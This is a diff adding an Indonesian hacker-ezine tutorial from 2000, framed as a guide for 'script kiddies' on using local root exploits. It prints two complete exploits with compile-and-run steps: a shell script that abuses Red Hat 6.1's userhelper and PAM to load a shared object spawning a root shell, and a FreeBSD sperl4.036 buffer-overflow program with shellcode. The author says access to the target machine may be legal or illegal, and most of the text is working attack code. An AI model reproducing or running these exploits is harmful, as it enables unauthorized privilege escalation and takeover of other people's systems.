@@ -1,0 +1,180 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+
+======================================================================
+Bagaimana Menggunakan Lokal Eksploit
+Script Kiddies Tutorial Bagian 1
+oleh: cbug aka CyberBug (Kecoak Elektronik)
+======================================================================
+
+Pemberitahuan :
+1. Artikel ini dimaksudkan untuk bahan pelajaran para admin dan siapa
+   saja yang ingin mengembangkan pengetahuan networking/internet mereka.
+2. Kecoak Elektronik tidak bertanggung jawab atas penyalah gunaan artikel
+   ini.
+3. Kecoak Elektronik tetap menyertakan dan tidak menghapus Nama Penulis
+   eksploit/script dengan harapan pembaca juga tetap menyertakan kredit
+   untuk mereka, jangan mengganti nama2 penulis artikel/eksploit/script
+   dengan nama anda dengan harapan nanti dianggap hacker.
+
+
+Kata pembuka : 
+Artikel ini saya buat karena melihat banyaknya pertanyaan di mailing list
+dan pertanyaan ke mail box saya tentang bagaimana sebenarnya menggunakan
+eksploit, bagaimana mendapatkan root ... btw saya bicara ttg *nix bukan
+windows.
+
+Berhubung RedHat adalah distro paling terkenal :( dan paling banyak di
+pakai di Indonesia, kita pake ini untuk contoh kita, kamu bisa gunakan
+RedHat 6.x atau Mandrake 6.x untuk tempat latihan ... dan FreeBSD 2.2.x 
+utk contoh sploit yang harus di compile dulu.
+
+Perlu saya tambahkan sedikit, lokal eksploit maksudnya eksploit yang harus
+dilakukan langsung di mesin yang ingin di crack, ini berarti kamu harus
+mempunyai akses telnet ke mesin tsb (legal atau illegal ... whatever).
+
+
+============================================================
+Mendapatkan lokal root shell di RedHat 6.x atau Mandrake 6.x
+============================================================
+
+1. Login atau telnet ke mesin kamu, user biasa (bukan root)
+2. Ketik atau copy/paste skrip berikut ini, berinama: gimmerewt.sh
+
+----------------------- mulai dari bawah sini ------------------
+#!/bin/sh
+#
+# pamslam - vulnerability in Redhat Linux 6.1 and PAM pam_start
+# found by dildog@l0pht.com
+#  
+# synopsis:
+#    both 'pam' and 'userhelper' (a setuid binary that comes with the
+#    'usermode-1.15' rpm) follow .. paths. Since pam_start calls down to
+#    _pam_add_handler(), we can get it to dlopen any file on disk. 'userhelper'
+#    being setuid means we can get root. 
+#
+# fix: 
+#    No fuckin idea for a good fix. Get rid of the .. paths in userhelper 
+#    for a quick fix. Remember 'strcat' isn't a very good way of confining
+#    a path to a particular subdirectory.
+#
+# props to my mommy and daddy, cuz they made me drink my milk.
+
+cat > _pamslam.c << EOF
+#include<stdlib.h>
+#include<unistd.h>
+#include<sys/types.h>
+void _init(void)
+{
+    setuid(geteuid());
+    system("/bin/sh");
+}
+EOF
+
+echo -n .
+
+echo -e auth\\trequired\\t$PWD/_pamslam.so > _pamslam.conf
+chmod 755 _pamslam.conf
+
+echo -n .
+
+gcc -fPIC -o _pamslam.o -c _pamslam.c
+
+echo -n o
+
+ld -shared -o _pamslam.so _pamslam.o
+
+echo -n o
+
+chmod 755 _pamslam.so
+
+echo -n O
+
+rm _pamslam.c
+rm _pamslam.o
+
+echo O
+
+/usr/sbin/userhelper -w ../../..$PWD/_pamslam.conf
+
+sleep 1s
+
+rm _pamslam.so
+rm _pamslam.conf
+------------------- garis ini jangan diketik bro -------------
+
+3. Set flag gimmerewt.sh ke executable
+   chmod +x gimmerewt.sh
+
+4. Jalankan
+   ./gimmerewt.sh
+
+
+=======================================
+Mendapatkan root shell di FreeBSD 2.2.x
+=======================================
+
+(for my old friend in wasantara.com - try this, I know you have a long
+search for the hole :) ... well since I'm in a good mood, I tell you).
+
+1. Login atau telnet ke mesin kamu, user biasa (bukan root)
+2. Ketik atau copy/paste skrip berikut ini, berinama: gimmerewt.c
+
+---------------------- mulai dari bawah ini --------------------
+ /************************************************************/
+/*   Exploit for FreeBSD sperl4.036 by OVX                  */
+/************************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define BUFFER_SIZE     1400
+#define OFFSET          600
+
+char *get_esp(void) {
+    asm("movl %esp,%eax");
+}
+char buf[BUFFER_SIZE];
+
+main(int argc, char *argv[])
+{
+        int i;
+        char execshell[] =
+        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
+
+        for(i=0+1;i<BUFFER_SIZE-4;i+=4)
+          *(char **)&buf[i] = get_esp() - OFFSET;
+
+        memset(buf,0x90,768+1);
+        memcpy(&buf[768+1],execshell,strlen(execshell));
+
+        buf[BUFFER_SIZE-1]=0;
+
+        execl("/usr/bin/sperl4.036", "/usr/bin/sperl4.036", buf, NULL);
+}
+----------------------- sampe disini aja -------------------------------
+
+3. Compile gimmerewt.c
+   gcc gimmerewt.c -o gimmerewt
+
+4. Jalankan
+   ./gimmerewt
+
+
+Penutup :
+Saya harap tulisan singkat ini bisa membuka wawasan rekan2 yang senang
+main-main dengan komputer.
+Jangan main api, kalau takut terbakar ... OK?
+
+Salam dari Manado,
+cbug@k-elektronik.org
+
+dinihari, 31 January 2000 
+
+
+
